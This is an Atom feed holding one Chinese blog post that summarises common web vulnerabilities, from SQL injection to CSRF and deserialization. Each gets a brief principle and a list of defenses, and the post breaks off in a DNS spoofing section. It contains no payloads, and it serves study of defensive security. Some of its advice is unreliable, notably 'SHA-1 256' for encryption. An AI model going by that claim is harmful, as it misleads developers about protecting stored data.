<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-05T09:17:49.728Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>史前的就业班  TOP N</title>
    <link href="http://yoursite.com/2018/09/04/%E5%B8%B8%E8%A7%81web%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2018/09/04/常见web攻击原理及防御/</id>
    <published>2018-09-04T12:30:05.000Z</published>
    <updated>2018-09-05T09:17:49.728Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-215.png" alt="upload successful"></p><h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>所谓SQL注入，就是通过把恶意数据插入到SQL命令查询中，最终达到欺骗服务器执行恶意的SQL命令的目的，产生的本质是把用户输入的数据当做代码执行。</p><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><p>用户能够控制数据的输入</p><p>执行的代码，拼接了用户的输入</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">使用安全的API</span><br><span class="line"></span><br><span class="line">对输入的特殊字符进行转义和实体化</span><br><span class="line"></span><br><span class="line">使用预编译语句，绑定变量</span><br><span class="line"></span><br><span class="line">使用安全的存储过程</span><br><span class="line"></span><br><span class="line">检查数据类型，限制输入数据的类型</span><br><span class="line"></span><br><span class="line">使用安全的函数，可以参考OWASP EAPI中的实现</span><br><span class="line"></span><br><span class="line">在数据库层上，采用最小权限原则。</span><br><span class="line"></span><br><span class="line">规范编码,字符集</span><br></pre></td></tr></table></figure><h2 id="XML实体注入-XXE"><a href="#XML实体注入-XXE" class="headerlink" title="XML实体注入(XXE)"></a>XML实体注入(XXE)</h2><h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>XML是一种常见的标记语言，XML 是对 HTML 的补充，XML 允许创作者定义自己的标签和自己的文档结构。</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用简单的数据格式（如： JSON）</span><br><span class="line"></span><br><span class="line">对用户输入的数据中包含的“语言本身的保留字符” 进行转义</span><br><span class="line"></span><br><span class="line">禁用XML外部实体</span><br><span class="line"></span><br><span class="line">采用白名单对输入进行过滤</span><br><span class="line"></span><br><span class="line">及时升级打补丁</span><br></pre></td></tr></table></figure><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过控制命令执行函数中的参数，注入恶意系统命令到正常命令中，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</span><br></pre></td></tr></table></figure><h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">禁用eval（）、system（）等可以执行命令的危险函数</span><br><span class="line"></span><br><span class="line">对参数进行过滤，对敏感字符进行转义</span><br><span class="line"></span><br><span class="line">参数值尽量使用引号包括</span><br></pre></td></tr></table></figure><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地文件包含就是通过浏览器包含Web服务器上的文件，即能打开并包含本地文件的漏洞</span><br><span class="line"></span><br><span class="line">文件包含在 php 中，涉及到的危险函数有四个，分别是 include()、include_once()、require()、require_once()</span><br></pre></td></tr></table></figure><h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">禁用. 点，防止URL回溯上级目录</span><br><span class="line"></span><br><span class="line">禁用0字节，防止0字节截断</span><br><span class="line"></span><br><span class="line">在PHP中用open_basedir(限制在某个特定目录下PHP能打开的文件)限制访问的文件目录</span><br><span class="line"></span><br><span class="line">避免包含动态变量</span><br></pre></td></tr></table></figure><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</span><br></pre></td></tr></table></figure><h5 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.ini配置文件里allow_url_include=off</span><br></pre></td></tr></table></figure><h1 id="XSS-跨站脚本"><a href="#XSS-跨站脚本" class="headerlink" title="XSS(跨站脚本)"></a>XSS(跨站脚本)</h1><p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。本质上也是注入，它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一种：反射型XSS       </span><br><span class="line"></span><br><span class="line">第二种：存储型XSS       </span><br><span class="line"></span><br><span class="line">第三种：DOM Based XSS</span><br></pre></td></tr></table></figure><h3 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h3><p>恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的</p><h3 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h3><p>攻击者输入的恶意代码在未经过任何处理验证的情况下，保存在数据库中，所有访问数据库的用户，都会在他们的浏览器中执行该恶意代码，造成持久性攻击。</p><h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM  Based  XSS:"></a>DOM  Based  XSS:</h3><p>漏洞是利用js代码中提取url地址i中的部分内容，只要网站中有这类取url的代码，就有可能回有DOM式XSS漏洞。</p><h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用自动编码的安全框架，如Ruby 3.0</span><br><span class="line"></span><br><span class="line">对关键cookie设置HTTPOnly</span><br><span class="line"></span><br><span class="line">对输入检查:XSS Filter，对特殊字符、上下文敏感数据进行过滤或者编码</span><br><span class="line"></span><br><span class="line">对输出检查:  安全的编码函数：Htmlencode，JavaScriptencode，PHP中有htmlentities()和htmlspecialchars()</span><br><span class="line"></span><br><span class="line">对富文本过滤采用白名单</span><br><span class="line"></span><br><span class="line">对变量是整个URL的，检查是否以http开头，再进行URLencode</span><br><span class="line"></span><br><span class="line">使用内容安全策略（CSP）</span><br></pre></td></tr></table></figure><h1 id="请求伪造漏洞"><a href="#请求伪造漏洞" class="headerlink" title="请求伪造漏洞"></a>请求伪造漏洞</h1><h3 id="服务端请求伪造-SSRF"><a href="#服务端请求伪造-SSRF" class="headerlink" title="服务端请求伪造(SSRF)"></a>服务端请求伪造(SSRF)</h3><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>由服务端发起请求的一种安全漏洞，SSRF攻击的目标是从外网无法访问的内部系统，很多web应用都提供从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以下载文件，读取文件内容，攻击者恶意利用存在缺陷的web应用作为代理来攻击远程和本地的服务器</p><h5 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">过滤返回的信息</span><br><span class="line"></span><br><span class="line">统一错误信息</span><br><span class="line"></span><br><span class="line">限制请求端口为http常用端口</span><br><span class="line"></span><br><span class="line">采用黑名单禁止访问内网IP</span><br><span class="line"></span><br><span class="line">禁用不必要的协议</span><br></pre></td></tr></table></figure><h3 id="跨站请求伪造-CSRF"><a href="#跨站请求伪造-CSRF" class="headerlink" title="跨站请求伪造(CSRF)"></a>跨站请求伪造(CSRF)</h3><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>攻击者利用用户的身份发起了用户不知道的请求，包括但不限于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以用户名义发邮件</span><br><span class="line"></span><br><span class="line">发消息</span><br><span class="line"></span><br><span class="line">盗账号</span><br><span class="line"></span><br><span class="line">购买商品</span><br><span class="line"></span><br><span class="line">虚拟货币转账</span><br></pre></td></tr></table></figure></p><h5 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">验证码：</span><br><span class="line"></span><br><span class="line">最简洁有效的防御方法，CSRF的攻击过程，往往是在用户不知情的情况下构造网络请求，验证码则要求用户必须与应用进行交互。出于用户体验考虑，验证码只能作为一种辅助手段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Referer Check：</span><br><span class="line"></span><br><span class="line">Referer Check最常见的应用是图片盗链，同样可以用来检查请求是否来自合法的源，Referer Check的缺陷在于并非什么时候都能取到referer，用户有时出于隐私保护考虑，会禁止referer的发送</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Anti CSRF token：</span><br><span class="line"></span><br><span class="line">CSRF的本质：其本质原因是：重要操作的所有参数都是可以被攻击者猜测到的于是可以通过把参数加密或者使用一些随机数，从而让攻击则无法猜测到参数值新增一个参数token，token的值是随机的，只被用户和服务器所共有，不被第三者知晓。</span><br></pre></td></tr></table></figure><h1 id="文件处理漏洞"><a href="#文件处理漏洞" class="headerlink" title="文件处理漏洞"></a>文件处理漏洞</h1><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>web应用程序在处理用户上传的文件时，解析了用户上传的恶意脚本文件，导致用户可以直接控制web服务器</p><h5 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件上传目录设置为不可执行</span><br><span class="line"></span><br><span class="line">判断文件的类型，采用白名单策略</span><br><span class="line"></span><br><span class="line">采用随机数来存储文件名</span><br><span class="line"></span><br><span class="line">单独设置文件服务器域名</span><br></pre></td></tr></table></figure><h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><h5 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h5><p>网站对用户查看或下载的文件没有做限制，则恶意用户可以查看或下载任意敏感文件，下载系统的配置文件、源代码等，从而获得更多的漏洞</p><h5 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤.(点)，使用户不能在url中回溯上级目录</span><br><span class="line"></span><br><span class="line">严格判断用户输入参数的格式</span><br><span class="line"></span><br><span class="line">限制文件的访问范围，如php.ini中配置open_basedir</span><br></pre></td></tr></table></figure><h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在网页上操作，通过调整iframe页面位置，诱使用户在不知情下点击iframe上的恶意按钮，执行恶意代码</p><p>通过调整iframe的长、宽及top、left的位置，可以覆盖到任意位置，position设为absolute，z-index设为最大，保持在页面的最上层，opacity控制页面的透明度，0为完全不可见。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h5 id="Flash点击劫持"><a href="#Flash点击劫持" class="headerlink" title="Flash点击劫持"></a>Flash点击劫持</h5><p>制作一个flash，诱使用户点击，在flash上覆盖iframe，通过诱导用户鼠标点击位置，完成较复杂的流程</p><h5 id="图片覆盖攻击-XSIO"><a href="#图片覆盖攻击-XSIO" class="headerlink" title="图片覆盖攻击(XSIO)"></a>图片覆盖攻击(XSIO)</h5><p>通过调整图片的style使图片覆盖在攻击者所指定的任意位置，并指向一个恶意网站。</p><h5 id="拖曳劫持–数据窃取"><a href="#拖曳劫持–数据窃取" class="headerlink" title="拖曳劫持–数据窃取"></a>拖曳劫持–数据窃取</h5><p>诱使用户从隐藏不可见iframe中“拖曳”出攻击者希望看到的数据，然后放到攻击者能控制的另一个页面中，从而完成数据窃取。</p><h5 id="触屏劫持"><a href="#触屏劫持" class="headerlink" title="触屏劫持"></a>触屏劫持</h5><p>通过将一个不可见的iframe覆盖到当前的网页中，可以劫持用户的触屏操作</p><h3 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.禁止跨域的iframe</span><br><span class="line"></span><br><span class="line">2.frame  busting</span><br><span class="line"></span><br><span class="line">3.HTTP头-X-Frame-Options，其值为deny时，会拒绝当前页加载任何frame页面，值为sameorigin，则frame页面的地址只能为同源域名下的页面，值为Allow-from时，可自定义允许的frame页面地址</span><br><span class="line"></span><br><span class="line">4.firefox的content security policy，以及Noscript的扩展</span><br></pre></td></tr></table></figure><h1 id="认证与会话-失效的身份认证"><a href="#认证与会话-失效的身份认证" class="headerlink" title="认证与会话-失效的身份认证"></a>认证与会话-失效的身份认证</h1><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>认证的目的是为了认出用户是谁，而授权的目的是决定用户能够做什么。认证实际上是验证凭证的过程，按凭证的多少可分为单因素认证和双因素认证或者多因素认证。</p><p>常用的认证方式有：</p><p>密码、多因素认证、session</p><h3 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h3><h5 id="密码策略："><a href="#密码策略：" class="headerlink" title="密码策略："></a>密码策略：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用密码优点是成本低，认证简单；缺点是安全性差，易被猜解</span><br><span class="line"></span><br><span class="line">密码8位及以上，并考虑双因素</span><br><span class="line"></span><br><span class="line">要区分大小写，大小写字母、数字、特殊符号至少两种及其以上</span><br><span class="line"></span><br><span class="line">不要有连续性字符</span><br><span class="line"></span><br><span class="line">避免出现重复字符</span><br><span class="line"></span><br><span class="line">不要使用公开数据或个人隐私相关数据作为密码</span><br><span class="line"></span><br><span class="line">存储前以不可逆加密算法进行加密</span><br></pre></td></tr></table></figure><h5 id="多因素认证"><a href="#多因素认证" class="headerlink" title="多因素认证"></a>多因素认证</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除密码外，可以采用动态口令、数字证书、支付盾、第三方证书等多因素进行认证，进而提高攻击的门槛</span><br></pre></td></tr></table></figure><h5 id="限制登录失败次数"><a href="#限制登录失败次数" class="headerlink" title="限制登录失败次数"></a>限制登录失败次数</h5><h5 id="不要使用默认凭证"><a href="#不要使用默认凭证" class="headerlink" title="不要使用默认凭证"></a>不要使用默认凭证</h5><h5 id="Session认证"><a href="#Session认证" class="headerlink" title="Session认证"></a>Session认证</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">采用成熟的开发框架</span><br><span class="line"></span><br><span class="line">在登录后采用足够强的随机数算法生成高度复杂的新随机会话ID</span><br><span class="line"></span><br><span class="line">sessionID加密后保存在cookie中</span><br><span class="line"></span><br><span class="line">一定时间后，强制销毁session</span><br><span class="line"></span><br><span class="line">当用户客户端发生变化，要求用户重新登录</span><br><span class="line"></span><br><span class="line">限制每个用户只拥有一个session</span><br></pre></td></tr></table></figure><h5 id="SSO单点登录"><a href="#SSO单点登录" class="headerlink" title="SSO单点登录"></a>SSO单点登录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户只需登录一次，就可以访问所有的系统，一旦单点被攻破，将影响所有使用单点登录的系统</span><br><span class="line"></span><br><span class="line">降低这种风险的方法是在一些敏感的系统里，加入额外的认证机制，如二次输入密码和手机短信</span><br></pre></td></tr></table></figure><h1 id="失效的-访问控制"><a href="#失效的-访问控制" class="headerlink" title="(失效的)访问控制"></a>(失效的)访问控制</h1><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>权限控制或者说访问控制，就是某个主体对某个客体需要实施某种操作，而系统对这种操作的限制就是权限控制。</p><h5 id="在操作系统中"><a href="#在操作系统中" class="headerlink" title="在操作系统中"></a>在操作系统中</h5><p>用户对文件进行操作，即为访问控制，用户、文件、操作三者构成访问控制列表ACL</p><p>用户对文件操作是否成功，将有操作系统给文件设置的ACL决定</p><p>用户能够做什么就是权限，在linux系统中，将权限分为读、写、执行</p><h5 id="在web应用中"><a href="#在web应用中" class="headerlink" title="在web应用中"></a>在web应用中</h5><p>根据访问客体不同，可以分为</p><p>‘基于URL的访问控制’</p><p>‘基于方法的访问控制’</p><p>‘基于数据的访问控制‘</p><p>这些都可以用加上‘基于页面的访问控制’来解决</p><h3 id="垂直权限"><a href="#垂直权限" class="headerlink" title="垂直权限"></a>垂直权限</h3><p>即‘基于角色的访问控制’，简称RBAC</p><p>一个角色实际上就是一个权限的集合，在系统验证权限时，只需要验证用户所属的角色，就可以根据该角色所拥有的权限进行授权。权限管理实际是业务逻辑问题</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>低权限的用户获得了高权限角色的能力，则发生了越权访问</p><h3 id="水平权限"><a href="#水平权限" class="headerlink" title="水平权限"></a>水平权限</h3><p>即’基于数据的访问控制‘，水平权限问题实际是缺乏一个用户到数据之间的对应关系</p><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>A用户访问到了同角色下B用户的数据，没有检查数据是否属于当前用户</p><h3 id="防御-10"><a href="#防御-10" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">配置权限时，使用最小权限原则</span><br><span class="line"></span><br><span class="line">使用默认拒绝策略</span><br><span class="line"></span><br><span class="line">只对有需要的主体单独配置允许策略</span><br><span class="line"></span><br><span class="line">通过规则引擎对数据的访问进行控制</span><br><span class="line"></span><br><span class="line">对访问速率进行限制</span><br><span class="line"></span><br><span class="line"> 记录失败的访问控制，并告警</span><br><span class="line"></span><br><span class="line">使用一次性的访问控制机制</span><br><span class="line"></span><br><span class="line">建立访问控制模型以强制执行所有权记录</span><br><span class="line"></span><br><span class="line">用户注销后，令牌失效</span><br></pre></td></tr></table></figure><h1 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h1><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问。</p><h3 id="防御-11"><a href="#防御-11" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">平台最小化安装，移除不适用的功能和框架</span><br><span class="line"></span><br><span class="line">开发、测试和生产环境进行相同配置，并且，每个环境中使用不同的密码</span><br><span class="line"></span><br><span class="line">及时更新升级、打补丁</span><br><span class="line"></span><br><span class="line">进行正确的安全配置和设置的自动化</span><br><span class="line"></span><br><span class="line">安装过程容器化</span><br></pre></td></tr></table></figure><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><h3 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h3><p>攻击者在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服<br>务器端窃取明文数据</p><h3 id="防御-12"><a href="#防御-12" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">数据分类，根据分类进行访问控制</span><br><span class="line"></span><br><span class="line">用不着保存的、重要的敏感数据，尽快清除</span><br><span class="line"></span><br><span class="line">对存储的所有敏感数据加密</span><br><span class="line"></span><br><span class="line">对传输过程中的数据加密</span><br><span class="line"></span><br><span class="line">使用密码专用算法存储密码    </span><br><span class="line"></span><br><span class="line">使用SHA-1  256进行加密，保护好密钥</span><br></pre></td></tr></table></figure><h1 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h1><h3 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h3><p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱，可能导致远程代码执行攻击</p><h3 id="防御-13"><a href="#防御-13" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">完整性检查，进行数字签名</span><br><span class="line"></span><br><span class="line">隔离运行反序列化的代码</span><br><span class="line"></span><br><span class="line">记录反序列化的失败信息</span><br><span class="line"></span><br><span class="line">限制反序列化网络连接</span><br></pre></td></tr></table></figure><h1 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h1><h3 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h3><p>基于组件开发的模式使得多数开发团队根本不了解其应用或API中使用的组件，更谈不上及时更新这些组件了</p><h3 id="防御-14"><a href="#防御-14" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">移除不需要的依赖、功能和组件</span><br><span class="line"></span><br><span class="line">关注所用组件的漏洞警告</span><br><span class="line"></span><br><span class="line">及时根据组件的漏洞警告，更新升级和打补丁</span><br><span class="line"></span><br><span class="line">从官网下载组件，并进行校验</span><br></pre></td></tr></table></figure><h1 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h1><h3 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h3><p>攻击者依靠监控的不足和响应的不及时完成攻击后却不被知晓</p><h3 id="防御-15"><a href="#防御-15" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将所有登录、访问控制失败、输入验证失败记录到日志中去</span><br><span class="line"></span><br><span class="line">完整性控制的审计，防止篡改、删除</span><br><span class="line"></span><br><span class="line"> 建立监控和告警机制</span><br><span class="line"></span><br><span class="line">建立应急响应机制和恢复计划</span><br><span class="line"></span><br><span class="line">ELK和zabbix以及Jumpserver堡垒机的使用</span><br></pre></td></tr></table></figure><h1 id="如何实施安全评估"><a href="#如何实施安全评估" class="headerlink" title="如何实施安全评估"></a>如何实施安全评估</h1><h4 id="资产等级划分"><a href="#资产等级划分" class="headerlink" title="资产等级划分"></a>资产等级划分</h4><h4 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h4><h4 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h4><h4 id="确认解决方案"><a href="#确认解决方案" class="headerlink" title="确认解决方案"></a>确认解决方案</h4><h1 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h1><p>DNS欺骗就是攻击者冒充<a 